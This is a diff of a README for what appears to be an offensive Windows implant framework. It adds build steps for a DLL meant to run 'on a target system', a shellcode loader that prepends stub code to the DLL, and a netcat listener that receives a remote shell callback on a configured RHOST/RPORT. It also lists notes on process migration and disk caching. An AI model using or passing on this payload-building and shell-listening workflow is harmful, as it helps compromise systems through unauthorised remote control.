@@ -18,17 +18,57 @@ Building
 You will need:
 
  * Cygwin (64 bit) -- make, mingw64-x86_64-gcc-g++
+ * Ruby (Cygwin's or native Window's version, doesn't matter)
+ * Git (well duh)
+ 
+Fire up cygwin
 
     ```
     git clone https://github.com/floomby/framework.git
     cd framework
-    make
+    ```
+
+Edit config.h to suit your need. The comments explain things.
+
+    ```
+    make dll
+    ```
+
+This builds framework.dll. It is up to you to get
+it running on a target system. There is shellcode
+in the shellcode directory to help you get started.
+
+Assuming RPORT => 1234 and RHOST => localhost you
+can do the following
+
+    ```
+    make tools
+    cd shellcode/loader
+    ./loader | ruby >sc && cat ../../framework.dll >>sc
+    (../../tools/sc-test/sc-test sc &) && nc -l 1234
+
     ```
     
 Usage
 -----
 
-    ```
-    (./launch.exe &) && nc -l 1234
-    
-    ```
+COMING SOON
+
+Bugs
+----
+
+Right now I am aware of two bugs, both are minor
+
+ * memory is not freeded properly on migration out of process
+ * sc-test stays running for a couple minutes when launched as
+   described in the instructions, this is due to it waiting
+   for all the windsock threads to terminate before exiting
+
+Notes
+-----
+
+ * patch is incomplete
+ * this is not much better than a normal shell
+ * it can be cached to disk
+ 
+All of these will be fixed in the nearish future.
